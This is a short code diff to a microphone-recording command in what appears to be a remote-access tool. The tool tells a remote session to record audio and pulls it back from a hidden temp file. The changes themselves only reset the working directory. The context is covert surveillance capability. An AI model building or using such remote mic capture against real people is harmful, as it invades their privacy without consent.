@@ -41,6 +41,8 @@ class command:
             	    return
 		
         if cmd_data['args'].split()[0] == "stop":
+	    w = os.environ['OLDPWD']
+            os.chdir(w)
 	    dest = cmd_data['args'].split()[1]
 	    cmd_data['args'] = "stop"
             if os.path.isdir(dest):
@@ -49,6 +51,8 @@ class command:
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
                         h.info_error("Failed to record mic!")
+			g = os.environ['HOME']
+                	os.chdir(g + "/mouse")
 			return
                     elif 'status' in result and result['status'] == 1:
                         data = session.download_file("/tmp/.avatmp")
@@ -75,6 +79,8 @@ class command:
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
                             h.info_error("Failed to record mic!")
+			    g = os.environ['HOME']
+                	    os.chdir(g + "/mouse")
 			    return
                         elif 'status' in result and result['status'] == 1:
                             data = session.download_file("/tmp/.avatmp")
@@ -88,6 +94,8 @@ class command:
                         h.info_error("Error: "+rp+": not a directory!")
                 else:
                     h.info_error("Local directory: "+rp+": does not exist!")
+	    g = os.environ['HOME']
+            os.chdir(g + "/mouse")
         
         elif cmd_data['args'].split()[0] == "start":
 	    cmd_data['args'] = "record"
